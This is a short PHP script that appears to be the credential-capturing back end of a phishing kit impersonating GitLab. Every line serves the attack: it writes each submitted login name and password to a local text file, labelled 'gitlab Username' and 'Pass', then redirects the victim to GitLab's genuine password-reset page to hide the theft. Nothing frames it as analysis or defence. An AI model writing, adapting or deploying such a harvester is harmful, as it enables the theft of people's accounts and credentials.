<?php
file_put_contents("../usernames.txt", "gitlab Username: " . $_POST['login'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://gitlab.com/users/password/new');
exit();
?>